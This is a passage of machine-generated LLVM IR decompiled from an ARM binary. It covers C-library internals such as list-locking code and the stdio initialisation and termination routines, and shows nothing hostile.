  %v2_16554 = add i32 %v0_16554, 152
  %v3_16554 = inttoptr i32 %v2_16554 to i32*
  %v4_16554 = load i32, i32* %v3_16554, align 4
  store i32 %v4_16554, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1655c = add i32 %v0_16554, 76
  %v3_1655c = inttoptr i32 %v2_1655c to i32*
  %v4_1655c = load i32, i32* %v3_1655c, align 4
  store i32 %v4_1655c, i32* @r1, align 4
  %v1_16560 = add i32 %v4_16554, 4
  %v2_16560 = inttoptr i32 %v1_16560 to i32*
  %v3_16560 = load i32, i32* %v2_16560, align 4
  store i32 %v3_16560, i32* %r3.global-to-local, align 4
  %v1_16564 = inttoptr i32 %v4_1655c to i32*
  %v2_16564 = load i32, i32* %v1_16564, align 4
  store i32 %v2_16564, i32* %r2.global-to-local, align 4
  %v1_16568 = add i32 %v3_16560, 1
  store i32 %v1_16568, i32* %r3.global-to-local, align 4
  store i32 %v1_16568, i32* %v2_16560, align 4
  %v0_16570 = load i32, i32* %r2.global-to-local, align 4
  %v1_16570 = load i32, i32* @r5, align 4
  %v2_16570 = add i32 %v1_16570, 32
  %v3_16570 = inttoptr i32 %v2_16570 to i32*
  store i32 %v0_16570, i32* %v3_16570, align 4
  %v0_16574 = load i32, i32* %r0.global-to-local, align 4
  %v1_16574 = add i32 %v0_16574, 4
  %v2_16574 = inttoptr i32 %v1_16574 to i32*
  %v3_16574 = load i32, i32* %v2_16574, align 4
  %v1_16578 = add i32 %v3_16574, -1
  store i32 %v1_16578, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1657c = icmp eq i32 %v1_16578, 0
  %v0_16580 = load i32, i32* @r5, align 4
  %v1_16580 = load i32, i32* @r1, align 4
  %v2_16580 = inttoptr i32 %v1_16580 to i32*
  store i32 %v0_16580, i32* %v2_16580, align 4
  %v0_16584 = load i32, i32* %r3.global-to-local, align 4
  %v1_16584 = load i32, i32* %r0.global-to-local, align 4
  %v2_16584 = add i32 %v1_16584, 4
  %v3_16584 = inttoptr i32 %v2_16584 to i32*
  store i32 %v0_16584, i32* %v3_16584, align 4
  br i1 %v2_1657c, label %dec_label_pc_1658c, label %dec_label_pc_165ec

dec_label_pc_1658c:                               ; preds = %dec_label_pc_16550
  %v0_1658c = load i32, i32* %r3.global-to-local, align 4
  %v1_1658c = load i32, i32* %r0.global-to-local, align 4
  %v2_1658c = add i32 %v1_1658c, 8
  %v3_1658c = inttoptr i32 %v2_1658c to i32*
  store i32 %v0_1658c, i32* %v3_1658c, align 4
  %v0_16590 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16590, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16594

dec_label_pc_16594:                               ; preds = %dec_label_pc_165c4.dec_label_pc_16594_crit_edge, %dec_label_pc_1658c
  %v0_16594 = phi i32 [ %v0_16594.pre, %dec_label_pc_165c4.dec_label_pc_16594_crit_edge ], [ %v0_16590, %dec_label_pc_1658c ]
  %v1_16594 = inttoptr i32 %v0_16594 to i32*
  %v2_16594 = load i32, i32* %v1_16594, align 4
  store i32 %v2_16594, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16594, i32* %r2.global-to-local, align 4
  %v2_165a083 = load i32, i32* %v1_16594, align 4
  store i32 %v2_165a083, i32* %r3.global-to-local, align 4
  %v3_165a485 = icmp uge i32 %v2_165a083, %v2_16594
  store i1 %v3_165a485, i1* %cpsr_c.global-to-local, align 1
  %v9_165a491 = icmp eq i32 %v2_165a083, %v2_16594
  br i1 %v9_165a491, label %dec_label_pc_165ac, label %dec_label_pc_165c4

dec_label_pc_165ac:                               ; preds = %dec_label_pc_16594, %dec_label_pc_165ac.dec_label_pc_165a0_crit_edge
  %v0_165ac92 = phi i32 [ %v1_165a4.pre, %dec_label_pc_165ac.dec_label_pc_165a0_crit_edge ], [ %v2_16594, %dec_label_pc_16594 ]
  store i32 %v0_165ac92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_165bc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_165bc, label %dec_label_pc_165c0, label %dec_label_pc_165ac.dec_label_pc_165a0_crit_edge

dec_label_pc_165ac.dec_label_pc_165a0_crit_edge:  ; preds = %dec_label_pc_165ac
  %v0_165a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_165a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_165a0 = inttoptr i32 %v0_165a0.pre to i32*
  %v2_165a0 = load i32, i32* %v1_165a0, align 4
  store i32 %v2_165a0, i32* %r3.global-to-local, align 4
  %v3_165a4 = icmp uge i32 %v2_165a0, %v1_165a4.pre
  store i1 %v3_165a4, i1* %cpsr_c.global-to-local, align 1
  %v9_165a4 = icmp eq i32 %v2_165a0, %v1_165a4.pre
  br i1 %v9_165a4, label %dec_label_pc_165ac, label %dec_label_pc_165c4

dec_label_pc_165c0:                               ; preds = %dec_label_pc_165ac
  %v0_165c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_165c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_165c4

dec_label_pc_165c4:                               ; preds = %dec_label_pc_16594, %dec_label_pc_165ac.dec_label_pc_165a0_crit_edge, %dec_label_pc_165c0
  %v0_165cc = phi i32 [ %v0_165c0, %dec_label_pc_165c0 ], [ %v2_165a083, %dec_label_pc_16594 ], [ %v2_165a0, %dec_label_pc_165ac.dec_label_pc_165a0_crit_edge ]
  %v1_165c4 = phi i32 [ %v0_165c0, %dec_label_pc_165c0 ], [ %v2_16594, %dec_label_pc_16594 ], [ %v1_165a4.pre, %dec_label_pc_165ac.dec_label_pc_165a0_crit_edge ]
  %v3_165c4 = icmp uge i32 %v0_165cc, %v1_165c4
  store i1 %v3_165c4, i1* %cpsr_c.global-to-local, align 1
  %v9_165c4 = icmp eq i32 %v0_165cc, %v1_165c4
  br i1 %v9_165c4, label %dec_label_pc_165cc, label %dec_label_pc_165c4.dec_label_pc_16594_crit_edge

dec_label_pc_165c4.dec_label_pc_16594_crit_edge:  ; preds = %dec_label_pc_165c4
  %v0_16594.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16594

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165c4
  %v2_165cc = icmp ne i32 %v1_165c4, 0
  store i1 %v2_165cc, i1* %cpsr_c.global-to-local, align 1
  %v7_165d0 = icmp slt i32 %v1_165c4, 2
  br i1 %v7_165d0, label %dec_label_pc_165ec, label %dec_label_pc_165d4

dec_label_pc_165d4:                               ; preds = %dec_label_pc_165cc
  %v0_165d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_165d4, i32* %r0.global-to-local, align 4
  %v0_165d8 = load i32, i32* @r1, align 4
  %v1_165d8 = add i32 %v0_165d8, 129
  store i32 %v1_165d8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165ec

dec_label_pc_165ec:                               ; preds = %dec_label_pc_16550, %dec_label_pc_165d4, %dec_label_pc_165cc
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_165f0 = load i32, i32* @r8, align 4
  %v2_165f0 = add i32 %v0_165f0, 160
  %v3_165f0 = inttoptr i32 %v2_165f0 to i32*
  %v4_165f0 = load i32, i32* %v3_165f0, align 4
  store i32 %v4_165f0, i32* %r0.global-to-local, align 4
  %v1_165f4 = add i32 %v4_165f0, 4
  %v2_165f4 = inttoptr i32 %v1_165f4 to i32*
  %v3_165f4 = load i32, i32* %v2_165f4, align 4
  %v1_165f8 = add i32 %v3_165f4, -1
  store i32 %v1_165f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165fc = icmp eq i32 %v1_165f8, 0
  store i32 %v1_165f8, i32* %v2_165f4, align 4
  br i1 %v2_165fc, label %dec_label_pc_16608, label %dec_label_pc_16670

dec_label_pc_16608:                               ; preds = %dec_label_pc_165ec
  %v0_16608 = load i32, i32* %r3.global-to-local, align 4
  %v1_16608 = load i32, i32* %r0.global-to-local, align 4
  %v2_16608 = add i32 %v1_16608, 8
  %v3_16608 = inttoptr i32 %v2_16608 to i32*
  store i32 %v0_16608, i32* %v3_16608, align 4
  %v0_1660c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1660c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16610

dec_label_pc_16610:                               ; preds = %dec_label_pc_16640.dec_label_pc_16610_crit_edge, %dec_label_pc_16608
  %v0_16610 = phi i32 [ %v0_16610.pre, %dec_label_pc_16640.dec_label_pc_16610_crit_edge ], [ %v0_1660c, %dec_label_pc_16608 ]
  %v1_16610 = inttoptr i32 %v0_16610 to i32*
  %v2_16610 = load i32, i32* %v1_16610, align 4
  store i32 %v2_16610, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16610, i32* %r2.global-to-local, align 4
  %v2_1661c71 = load i32, i32* %v1_16610, align 4
  store i32 %v2_1661c71, i32* %r3.global-to-local, align 4
  %v3_1662073 = icmp uge i32 %v2_1661c71, %v2_16610
  store i1 %v3_1662073, i1* %cpsr_c.global-to-local, align 1
  %v9_1662079 = icmp eq i32 %v2_1661c71, %v2_16610
  br i1 %v9_1662079, label %dec_label_pc_16628, label %dec_label_pc_16640

dec_label_pc_16628:                               ; preds = %dec_label_pc_16610, %dec_label_pc_16628.dec_label_pc_1661c_crit_edge
  %v0_1662880 = phi i32 [ %v1_16620.pre, %dec_label_pc_16628.dec_label_pc_1661c_crit_edge ], [ %v2_16610, %dec_label_pc_16610 ]
  store i32 %v0_1662880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16638 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16638, label %dec_label_pc_1663c, label %dec_label_pc_16628.dec_label_pc_1661c_crit_edge

dec_label_pc_16628.dec_label_pc_1661c_crit_edge:  ; preds = %dec_label_pc_16628
  %v0_1661c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16620.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1661c = inttoptr i32 %v0_1661c.pre to i32*
  %v2_1661c = load i32, i32* %v1_1661c, align 4
  store i32 %v2_1661c, i32* %r3.global-to-local, align 4
  %v3_16620 = icmp uge i32 %v2_1661c, %v1_16620.pre
  store i1 %v3_16620, i1* %cpsr_c.global-to-local, align 1
  %v9_16620 = icmp eq i32 %v2_1661c, %v1_16620.pre
  br i1 %v9_16620, label %dec_label_pc_16628, label %dec_label_pc_16640

dec_label_pc_1663c:                               ; preds = %dec_label_pc_16628
  %v0_1663c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1663c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16640

dec_label_pc_16640:                               ; preds = %dec_label_pc_16610, %dec_label_pc_16628.dec_label_pc_1661c_crit_edge, %dec_label_pc_1663c
  %v0_16648 = phi i32 [ %v0_1663c, %dec_label_pc_1663c ], [ %v2_1661c71, %dec_label_pc_16610 ], [ %v2_1661c, %dec_label_pc_16628.dec_label_pc_1661c_crit_edge ]
  %v1_16640 = phi i32 [ %v0_1663c, %dec_label_pc_1663c ], [ %v2_16610, %dec_label_pc_16610 ], [ %v1_16620.pre, %dec_label_pc_16628.dec_label_pc_1661c_crit_edge ]
  %v3_16640 = icmp uge i32 %v0_16648, %v1_16640
  store i1 %v3_16640, i1* %cpsr_c.global-to-local, align 1
  %v9_16640 = icmp eq i32 %v0_16648, %v1_16640
  br i1 %v9_16640, label %dec_label_pc_16648, label %dec_label_pc_16640.dec_label_pc_16610_crit_edge

dec_label_pc_16640.dec_label_pc_16610_crit_edge:  ; preds = %dec_label_pc_16640
  %v0_16610.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16610

dec_label_pc_16648:                               ; preds = %dec_label_pc_16640
  %v2_16648 = icmp ne i32 %v1_16640, 0
  store i1 %v2_16648, i1* %cpsr_c.global-to-local, align 1
  %v7_1664c = icmp slt i32 %v1_16640, 2
  br i1 %v7_1664c, label %dec_label_pc_16670, label %dec_label_pc_16650

dec_label_pc_16650:                               ; preds = %dec_label_pc_16648
  %v0_16650 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16650, i32* %r0.global-to-local, align 4
  %v0_16654 = load i32, i32* @r1, align 4
  %v1_16654 = add i32 %v0_16654, 129
  store i32 %v1_16654, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16670

dec_label_pc_1666c:                               ; preds = %dec_label_pc_162b0, %dec_label_pc_16294, %dec_label_pc_162bc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16670

dec_label_pc_16670:                               ; preds = %dec_label_pc_165ec, %dec_label_pc_16648, %bb57, %dec_label_pc_162f4, %dec_label_pc_16650, %dec_label_pc_1666c
  %v0_16670 = load i32, i32* @r5, align 4
  store i32 %v0_16670, i32* %r0.global-to-local, align 4
  %v2_16678 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16678, i32* %r4.global-to-local, align 4
  store i32 %v6_16254, i32* @r5, align 4
  store i32 %v9_16254, i32* @r6, align 4
  store i32 %v12_16254, i32* @r7, align 4
  store i32 %v15_16254, i32* @r8, align 4
  ret i32 %v0_16670

; uselistorder directives
  uselistorder i32 %v0_1663c, { 1, 0, 2 }
  uselistorder i32 %v1_16620.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16610, { 1, 0 }
  uselistorder i32 %v0_165c0, { 1, 0, 2 }
  uselistorder i32 %v1_165a4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16594, { 1, 0 }
  uselistorder i32 %v0_1653c, { 1, 0, 2 }
  uselistorder i32 %v1_16520.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_164d4, { 1, 0, 2 }
  uselistorder i32 %v1_164b8, { 0, 2, 1 }
  uselistorder i32 %v4_16494, { 2, 1, 0, 3 }
  uselistorder i32 %v1_16444.pre, { 2, 1, 0 }
  uselistorder i32 %v0_163c8, { 1, 2, 0 }
  uselistorder i32 %v1_16358, { 1, 0 }
  uselistorder i32 %v0_16358, { 1, 0 }
  uselistorder i32 %v1_16340, { 1, 2, 0, 3 }
  uselistorder i32 %v1_162e4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 53, 6, 7, 8, 9, 10, 12, 11, 52, 14, 13, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1, 50, 51 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 36, 37, 4, 5, 6, 8, 7, 0, 9, 10, 11, 34, 35, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 16384, { 75, 76, 0, 77, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 18, 74, 17, 64, 16, 52, 36, 53, 3, 54, 4, 55, 5, 56, 37, 57, 6, 58, 7, 59, 8, 60, 9, 61, 10, 62, 11, 63, 35, 65, 12, 66, 13, 67, 44, 80, 14, 81, 15, 82, 19, 78, 45, 79, 21, 83, 47, 84, 48, 85, 49, 86, 20, 87, 46, 88, 89, 22, 90, 23, 91, 24, 92, 50, 93, 25, 1, 26, 94, 27, 95, 29, 96, 28, 97, 31, 98, 30, 99, 51, 100, 32, 2, 33, 101, 34, 102 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 16, 0, 15, 12, 11, 2, 1, 14, 13, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 ()* @malloc, { 49, 48, 47, 4, 3, 2, 0, 1, 7, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 12, 11, 5, 4, 3, 2, 1, 8, 7, 6, 10, 9, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_16670, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1666c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16640, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16628, { 1, 0 }
  uselistorder label %dec_label_pc_165ec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_165c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165ac, { 1, 0 }
  uselistorder label %dec_label_pc_16550, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_16540, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16528, { 1, 0 }
  uselistorder label %dec_label_pc_164e8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_164d8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16420, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_16388._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16330, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_162cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16294, { 1, 2, 0 }
}

define i32 @function_16684(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16684:
  %v0_16684 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16684, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16684
  %v5_16684 = sdiv i32 %arg2, 16
  %v6_16684 = and i32 %v5_16684, %arg1
  %v5_16688 = sdiv i32 %arg2, 256
  %v6_16688 = and i32 %v6_16684, %v5_16688
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16684, %bb
  %v7_1668c = phi i32 [ %arg1, %dec_label_pc_16684 ], [ %v6_16688, %bb ]
  ret i32 %v7_1668c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_166bc = call i32 @__aeabi_read_tp()
  %v3_166c0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_166c0 = sext i16 %v3_166c0 to i32
  store i32 %v4_166c0, i32* @r3, align 4
  store i32 %v0_166bc, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_166cc = add i32 %v4_166c0, %v0_166bc
  %v3_166cc = inttoptr i32 %v2_166cc to i32*
  %v4_166cc = load i32, i32* %v3_166cc, align 4
  store i32 %v4_166cc, i32* @r6, align 4
  %v1_166d0 = call i32 @isatty(i32 0)
  %v2_166d8 = icmp eq i32 %v1_166d0, 0
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r4, align 4
  br i1 %v2_166d8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_166e4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 308) to i16*), align 4
  %v7_166e4 = zext i16 %v5_166e4 to i32
  %v2_166e8 = xor i32 %v7_166e4, 256
  store i32 %v2_166e8, i32* @r3, align 4
  %v2_166ec = trunc i32 %v2_166e8 to i16
  store i16 %v2_166ec, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_166f4 = call i32 @isatty(i32 1)
  %v2_166f8 = icmp eq i32 %v1_166f4, 0
  br i1 %v2_166f8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_16700 = load i32, i32* @r4, align 4
  %v2_16704 = add i32 %v1_16700, 376
  %v3_16704 = inttoptr i32 %v2_16704 to i16*
  %v4_16704 = load i16, i16* %v3_16704, align 2
  %v2_16708 = xor i16 %v4_16704, 256
  store i16 %v2_16708, i16* %v3_16704, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_16714 = load i16, i16* @global_var_2222c.358, align 2
  %v4_16714 = sext i16 %v3_16714 to i32
  %v0_16718 = load i32, i32* @r6, align 4
  %v1_16718 = load i32, i32* @r5, align 4
  %v3_16718 = add i32 %v1_16718, %v4_16714
  %v4_16718 = inttoptr i32 %v3_16718 to i32*
  store i32 %v0_16718, i32* %v4_16718, align 4
  ret i32 %v1_166f4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_16734 = load i32, i32* @r4, align 4
  store i32 %v3_16734, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_16748 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_16748, i32* %r0.global-to-local, align 4
  %v5_16748 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_16748, i32* %r1.global-to-local, align 4
  %v8_16748 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -33092) to i32*), align 4
  %v2_16750 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_16750, i32* %r3.global-to-local, align 4
  store i32 %v2_16748, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1675c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 152) to i32*), align 4
  store i32 %v2_16748, i32* %r0.global-to-local, align 4
  store i32 %v5_16748, i32* %r1.global-to-local, align 4
  store i32 %v8_16748, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_1676c = inttoptr i32 %v4_1675c to i32*
  store i32 %v2_16748, i32* %v1_1676c, align 4
  %v3_1676c = add i32 %v4_1675c, 4
  %v4_1676c = inttoptr i32 %v3_1676c to i32*
  %v5_1676c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1676c, i32* %v4_1676c, align 4
  %v6_1676c = add i32 %v4_1675c, 8
  %v7_1676c = inttoptr i32 %v6_1676c to i32*
  %v8_1676c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1676c, i32* %v7_1676c, align 4
  %v0_16770 = load i32, i32* %r3.global-to-local, align 4
  %v1_16770 = inttoptr i32 %v0_16770 to i32*
  %v2_16770 = load i32, i32* %v1_16770, align 4
  store i32 %v2_16770, i32* %r0.global-to-local, align 4
  %v3_16770 = add i32 %v0_16770, 4
  %v4_16770 = inttoptr i32 %v3_16770 to i32*
  %v5_16770 = load i32, i32* %v4_16770, align 4
  store i32 %v5_16770, i32* %r1.global-to-local, align 4
  %v6_16770 = add i32 %v0_16770, 8
  %v7_16770 = inttoptr i32 %v6_16770 to i32*
  %v8_16770 = load i32, i32* %v7_16770, align 4
  %v2_16774 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16774, i32* %r3.global-to-local, align 4
  store i32 %v2_16770, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_16780 = load i32, i32* %r7.global-to-local, align 4
  %v2_16780 = add i32 %v0_16780, 76
  %v3_16780 = inttoptr i32 %v2_16780 to i32*
  %v4_16780 = load i32, i32* %v3_16780, align 4
  store i32 %v4_16780, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_16788 = inttoptr i32 %v4_16780 to i32*
  %v2_16788 = load i32, i32* %v1_16788, align 4
  store i32 %v2_16788, i32* %r5.global-to-local, align 4
  %v2_1678c = add i32 %v0_16780, 160
  %v3_1678c = inttoptr i32 %v2_1678c to i32*
  %v4_1678c = load i32, i32* %v3_1678c, align 4
  store i32 %v2_16770, i32* %r0.global-to-local, align 4
  store i32 %v5_16770, i32* %r1.global-to-local, align 4
  store i32 %v8_16770, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_1679c = add i32 %v0_16780, -33124
  store i32 %v2_1679c, i32* %sl.global-to-local, align 4
  %v1_167a0 = inttoptr i32 %v4_1678c to i32*
  store i32 %v2_16770, i32* %v1_167a0, align 4
  %v3_167a0 = add i32 %v4_1678c, 4
  %v4_167a0 = inttoptr i32 %v3_167a0 to i32*
  %v5_167a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_167a0, i32* %v4_167a0, align 4
  %v6_167a0 = add i32 %v4_1678c, 8
  %v7_167a0 = inttoptr i32 %v6_167a0 to i32*
  %v8_167a0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_167a0, i32* %v7_167a0, align 4
  %v0_16830.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1683016 = icmp eq i32 %v0_16830.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1683818 = add i32 %v0_16830.pr, 56
  store i32 %v1_1683818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1683016, label %dec_label_pc_16844, label %dec_label_pc_167a8

dec_label_pc_167a8:                               ; preds = %entry, %.thread10
  %v0_167a8 = phi i32 [ %v3_1682c, %.thread10 ], [ %v0_16830.pr, %entry ]
  %v1_167a8 = add i32 %v0_167a8, 64
  %v2_167a8 = inttoptr i32 %v1_167a8 to i32*
  %v3_167a8 = load i32, i32* %v2_167a8, align 4
  store i32 %v3_167a8, i32* %r3.global-to-local, align 4
  %v0_167ac = call i32 @__aeabi_read_tp()
  store i32 %v0_167ac, i32* %r0.global-to-local, align 4
  %v1_167b0 = add i32 %v0_167ac, -1168
  store i32 %v1_167b0, i32* %r6.global-to-local, align 4
  %v3_167b4 = icmp uge i32 %v3_167a8, %v1_167b0
  store i1 %v3_167b4, i1* %cpsr_c.global-to-local, align 1
  %v9_167b4 = icmp eq i32 %v3_167a8, %v1_167b0
  br i1 %v9_167b4, label %.thread1, label %dec_label_pc_167c8

.thread1:                                         ; preds = %dec_label_pc_167a8
  %v1_167b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_167b8 = add i32 %v1_167b8, 60
  %v3_167b8 = inttoptr i32 %v2_167b8 to i32*
  %v4_167b8 = load i32, i32* %v3_167b8, align 4
  %v2_167bc = add i32 %v4_167b8, 1
  store i32 %v2_167bc, i32* %r3.global-to-local, align 4
  store i32 %v2_167bc, i32* %v3_167b8, align 4
  br label %.thread10

dec_label_pc_167c8:                               ; preds = %dec_label_pc_167a8, %dec_label_pc_167d4
  %v0_167c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_167c8 = inttoptr i32 %v0_167c8 to i32*
  %v2_167c8 = load i32, i32* %v1_167c8, align 4
  store i32 %v2_167c8, i32* %r3.global-to-local, align 4
  %v1_167cc = load i32, i32* %r4.global-to-local, align 4
  %v3_167cc = icmp uge i32 %v2_167c8, %v1_167cc
  store i1 %v3_167cc, i1* %cpsr_c.global-to-local, align 1
  %v9_167cc = icmp eq i32 %v2_167c8, %v1_167cc
  br i1 %v9_167cc, label %dec_label_pc_167d4, label %dec_label_pc_167ec

dec_label_pc_167d4:                               ; preds = %dec_label_pc_167c8
  store i32 %v2_167c8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
